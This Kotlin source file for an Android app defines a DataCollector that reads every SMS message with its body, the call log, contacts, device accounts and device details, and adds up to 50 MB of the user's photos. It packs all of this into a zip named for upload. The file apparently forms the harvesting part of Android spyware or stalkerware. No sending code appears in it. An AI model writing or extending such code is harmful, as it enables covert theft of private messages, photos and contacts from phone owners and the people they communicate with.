package com.example.foregroundservice

import android.accounts.AccountManager
import android.content.ContentUris
import android.content.Context
import android.database.Cursor
import android.os.Build
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.MediaStore
import android.provider.Telephony
import org.json.JSONArray
import org.json.JSONObject
import java.io.BufferedOutputStream
import java.io.File
import java.io.FileOutputStream
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream

object DataCollector {

    private const val MAX_PHOTO_BYTES = 50L * 1024 * 1024 // 50mb

    fun collectAllAsZip(context: Context): File {
        val zipFile = File(context.cacheDir, "upload_${System.currentTimeMillis()}.zip")

        ZipOutputStream(BufferedOutputStream(FileOutputStream(zipFile))).use { zip ->
            // 1. data.json
            val json = collectMetadata(context)
            zip.putNextEntry(ZipEntry("data.json"))
            zip.write(json.toString().toByteArray(Charsets.UTF_8))
            zip.closeEntry()

            // 2. photos/
            val photoIds = collectPhotoIds(context)
            var written = 0L
            for (id in photoIds) {
                if (written >= MAX_PHOTO_BYTES) break
                val bytes = readPhotoBytes(context, id) ?: continue
                zip.putNextEntry(ZipEntry("photos/$id.jpg"))
                zip.write(bytes)
                zip.closeEntry()
                written += bytes.size
            }
        }
        return zipFile
    }

    private fun collectMetadata(context: Context): JSONObject {
        val result = JSONObject()
        result.put("device", collectDeviceInfo())
        result.put("sms", collectSms(context))
        result.put("calls", collectCalls(context))
        result.put("contacts", collectContacts(context))
        result.put("accounts", collectAccounts(context))
        return result
    }

    private fun collectDeviceInfo(): JSONObject {
        val info = JSONObject()
        info.put("manufacturer", Build.MANUFACTURER)
        info.put("model", Build.MODEL)
        info.put("androidVersion", Build.VERSION.RELEASE)
        info.put("sdk", Build.VERSION.SDK_INT)
        return info
    }

    private fun collectSms(context: Context): JSONArray {
        val arr = JSONArray()
        val cursor: Cursor? = context.contentResolver.query(
            Telephony.Sms.CONTENT_URI,
            arrayOf(Telephony.Sms.ADDRESS, Telephony.Sms.BODY, Telephony.Sms.DATE),
            null, null, null
        )
        cursor?.use {
            while (it.moveToNext()) {
                val sms = JSONObject()
                sms.put("address", it.getString(0) ?: "")
                sms.put("body", it.getString(1) ?: "")
                sms.put("date", it.getLong(2))
                arr.put(sms)
            }
        }
        return arr
    }

    private fun collectCalls(context: Context): JSONArray {
        val arr = JSONArray()
        val cursor = context.contentResolver.query(
            CallLog.Calls.CONTENT_URI,
            arrayOf(
                CallLog.Calls.NUMBER,
                CallLog.Calls.TYPE,
                CallLog.Calls.DATE,
                CallLog.Calls.DURATION
            ),
            null, null, null
        )
        cursor?.use {
            while (it.moveToNext()) {
                val call = JSONObject()
                call.put("number", it.getString(0) ?: "")
                call.put("type", it.getInt(1))
                call.put("date", it.getLong(2))
                call.put("duration", it.getLong(3))
                arr.put(call)
            }
        }
        return arr
    }

    private fun collectContacts(context: Context): JSONArray {
        val arr = JSONArray()
        val cursor = context.contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            arrayOf(
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.NUMBER
            ),
            null, null, null
        )
        cursor?.use {
            while (it.moveToNext()) {
                val contact = JSONObject()
                contact.put("name", it.getString(0) ?: "")
                contact.put("number", it.getString(1) ?: "")
                arr.put(contact)
            }
        }
        return arr
    }

    private fun collectAccounts(context: Context): JSONArray {
        val arr = JSONArray()
        val am = AccountManager.get(context)
        for (account in am.accounts) {
            val acc = JSONObject()
            acc.put("name", account.name)
            acc.put("type", account.type)
            arr.put(acc)
        }
        return arr
    }

    private fun collectPhotoIds(context: Context): List<Long> {
        val ids = mutableListOf<Long>()
        val cursor = context.contentResolver.query(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            arrayOf(MediaStore.Images.Media._ID),
            null, null, null
        )
        cursor?.use {
            while (it.moveToNext()) {
                ids.add(it.getLong(0))
            }
        }
        return ids
    }

    private fun readPhotoBytes(context: Context, id: Long): ByteArray? {
        val uri = ContentUris.withAppendedId(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id
        )
        return try {
            context.contentResolver.openInputStream(uri)?.use { it.readBytes() }
        } catch (e: Exception) {
            null
        }
    }
}
